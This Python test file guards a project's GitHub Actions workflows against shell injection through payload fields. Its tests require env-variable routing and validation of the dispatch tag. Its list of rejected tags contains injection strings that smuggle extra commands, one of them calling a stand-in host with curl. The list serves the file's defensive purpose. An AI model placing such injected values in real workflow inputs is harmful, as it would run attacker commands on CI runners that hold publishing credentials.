"""Workflow payload values must reach the shell as environment variables.

GitHub substitutes `${{ }}` into the script text before the runner executes it, so a payload field
that contains shell metacharacters becomes code: the dispatch input of `docker.yml` is typed by the
caller, the release tag name comes from the release payload, and the PR number from the PR payload.
That runner holds `packages: write` and a registry token. The dispatch input also selects the
checkout ref and the published Docker tag, so an arbitrary string there publishes code from a ref
nobody asked for, or writes a malformed tag. Values therefore arrive through `env`, and the dispatch
tag is checked against a plain tag-name shape before anything consumes it.
"""

from __future__ import annotations

import re
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
WORKFLOW_DIR = PROJECT_ROOT / ".github" / "workflows"
DOCKER = (WORKFLOW_DIR / "docker.yml").read_text(encoding="utf-8")
WORKFLOWS = sorted(WORKFLOW_DIR.glob("*.yml"))

# A release tag name: no slashes, spaces, quotes, metacharacters or leading option dashes.
TAG_SHAPE = r"^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$"

# Payloads that must never be accepted: they inject shell text, name another ref, or read as an
# option to git. A trailing newline is rejected too, since bash anchors the whole value.
REJECTED_TAGS = [
    'v1.0.0"; echo PWNED; #',
    "v1.0.0 && curl http://evil",
    "refs/heads/master",
    "refs/tags/v1.0.0",
    "-x",
    "a" * 129,
    "",
    "v1.0.0\n",
]
ACCEPTED_TAGS = ["v1.0.0", "1.18.0", "v1.18.0-rc1", "a" * 128]

_STEP_START = re.compile(r"^      - name: (.+)$")
_CONTEXT_INTERPOLATION = re.compile(r"\$\{\{")
_ENV_REFERENCE = re.compile(r"\$\{\{ env\.([A-Za-z0-9_]+) \}\}")


def _steps(workflow: str) -> list[tuple[str, str]]:
    """The ``(name, body)`` pairs of a job's steps, with the step's own lines as the body."""
    lines = workflow.splitlines()
    starts = [index for index, line in enumerate(lines) if _STEP_START.match(line)]
    steps: list[tuple[str, str]] = []
    for position, start in enumerate(starts):
        end = starts[position + 1] if position + 1 < len(starts) else len(lines)
        header = _STEP_START.match(lines[start])
        assert header is not None
        steps.append((header.group(1), "\n".join(lines[start + 1 : end])))
    return steps


def _run_body(step_body: str) -> str:
    """The script of a ``run:`` step, i.e. the lines indented below the ``run:`` key."""
    collected: list[str] = []
    collecting = False
    for line in step_body.splitlines():
        if line.strip().startswith("run:"):
            collecting = True
            continue
        if collecting:
            if line.strip() and not line.startswith("          "):
                break  # a sibling key at the step's own indent ends the script
            collected.append(line)
    return "\n".join(collected)


def _step(workflow: str, name_fragment: str) -> str:
    match = next((body for name, body in _steps(workflow) if name_fragment in name), None)
    assert match is not None, f"workflow must have a step matching {name_fragment!r}"
    return match


def _workflow_level_env(workflow: str) -> str:
    """The top-level ``env:`` block, i.e. until the next top-level key."""
    lines = workflow.splitlines()
    start = next(index for index, line in enumerate(lines) if line == "env:")
    end = next(index for index in range(start + 1, len(lines)) if re.fullmatch(r"[A-Za-z0-9_-]+:", lines[index]))
    return "\n".join(lines[start:end])


def _env_blocks(workflow: str) -> list[dict[str, str]]:
    """Every ``env:`` block in the workflow, as ``{key: value}`` maps."""
    lines = workflow.splitlines()
    blocks: list[dict[str, str]] = []
    for index, line in enumerate(lines):
        if line.strip() != "env:":
            continue
        indent = len(line) - len(line.lstrip())
        entries: dict[str, str] = {}
        for following in lines[index + 1 :]:
            stripped = following.strip()
            if not stripped or stripped.startswith("#"):
                continue
            if len(following) - len(following.lstrip()) <= indent:
                break  # dedent ends the block
            key, _, value = stripped.partition(":")
            entries[key.strip()] = value.strip()
        blocks.append(entries)
    return blocks


def test_workflow_files_are_yaml_safe() -> None:
    """YAML rejects tabs, and a tab in an Actions file is a silent parse failure."""
    for path in WORKFLOWS:
        assert "\t" not in path.read_text(encoding="utf-8"), f"{path.name} must indent with spaces"


def test_the_tag_shape_rejects_injection_and_option_dashes() -> None:
    """The shape the workflow validates must be the one that neutralises the payload.

    `fullmatch` mirrors bash's `[[ =~ ]]`, which anchors at both ends of the whole value; Python's
    `$` would also accept a trailing newline.
    """
    shape = re.compile(TAG_SHAPE.lstrip("^").rstrip("$"))

    for tag in REJECTED_TAGS:
        assert not shape.fullmatch(tag), f"{tag!r} must be rejected"

    for tag in ACCEPTED_TAGS:
        assert shape.fullmatch(tag), f"{tag!r} must be accepted"


def test_every_env_reference_names_a_defined_key() -> None:
    """A typo in `${{ env.NAME }}` evaluates to an empty string, so a ref or tag silently vanishes."""
    for path in WORKFLOWS:
        workflow = path.read_text(encoding="utf-8")
        defined = set()
        for block in _env_blocks(workflow):
            defined |= set(block)

        for reference in _ENV_REFERENCE.findall(workflow):
            assert reference in defined, f"{path.name} references env.{reference}, which no env: block defines"


def test_no_workflow_value_is_interpolated_into_a_shell_script() -> None:
    """`${{ }}` inside a script is text substitution, so payload text can become shell code."""
    for path in WORKFLOWS:
        workflow = path.read_text(encoding="utf-8")
        for name, body in _steps(workflow):
            script = _run_body(body)
            assert not _CONTEXT_INTERPOLATION.search(script), (
                f"{path.name} step {name!r} must read workflow values from environment variables, "
                "not interpolate them into the script"
            )


def test_dispatch_input_never_reaches_a_command_tag_or_ref_directly() -> None:
    """The dispatch input is caller-typed text that selects the ref and the published tag."""
    env_block = _workflow_level_env(DOCKER)

    assert "${{ github.event.inputs." in env_block, "the dispatch input must arrive via env"
    assert "${{ github.event.inputs." not in DOCKER.replace(env_block, ""), (
        "workflow_dispatch inputs must be mapped to an environment variable once, in env:"
    )


def test_checkout_ref_and_docker_tag_use_the_env_value() -> None:
    """Both consume the dispatch tag, so both must take the env mapping rather than the payload."""
    checkout = _step(DOCKER, "Checkout repository")
    metadata = _step(DOCKER, "Extract Docker metadata")

    assert "ref: ${{ env." in checkout, "the checkout ref must come from env"
    assert "type=raw,value=${{ env.DISPATCH_TAG }}" in metadata, "the published tag must come from env"


def test_dispatch_tag_is_validated_before_anything_uses_it() -> None:
    """A tag that is not a plain tag name must fail before the checkout or the tag list."""
    names = [name for name, _ in _steps(DOCKER)]
    validator = next((index for index, name in enumerate(names) if "dispatch tag" in name.lower()), None)
    assert validator is not None, "a dispatched build must reject malformed tags"

    checkout_index = names.index("Checkout repository")
    assert validator < checkout_index, "the tag must be validated before it selects the checkout ref"

    script = _run_body(_steps(DOCKER)[validator][1])
    assert TAG_SHAPE in script, "the validation must pin the tag shape"
    assert "$DISPATCH_TAG" in script, "the validation must read the env value, not the payload"


def test_build_version_stays_derived_from_the_event() -> None:
    """Regression: the routing must not change which version the image is stamped with."""
    script = _run_body(_step(DOCKER, "Determine server build version"))

    for variable in ("RELEASE_TAG", "DISPATCH_TAG", "PR_NUMBER", "REF_NAME"):
        assert f"${variable}" in script or f"${{{variable}}}" in script, f"{variable} must feed the build version"
    assert "build_version=" in script, "the resolved version must still be exported to GITHUB_OUTPUT"

    build_args = [line for line in DOCKER.splitlines() if line.strip().startswith("BUILD_VERSION=")]
    assert len(build_args) == 2, "the scan build and the pushed build must both carry the version"
    assert all(line.endswith("steps.build_version.outputs.build_version }}") for line in build_args), (
        "both builds must use the resolved version, not a payload value"
    )


def test_workflows_never_interpolate_event_payload_into_a_script() -> None:
    """The invariant holds repository-wide, not only in the publishing workflow."""
    for path in WORKFLOWS:
        workflow = path.read_text(encoding="utf-8")
        for name, body in _steps(workflow):
            script = _run_body(body)
            assert "${{ github.event." not in script, (
                f"{path.name} step {name!r} interpolates the event payload into the script"
            )
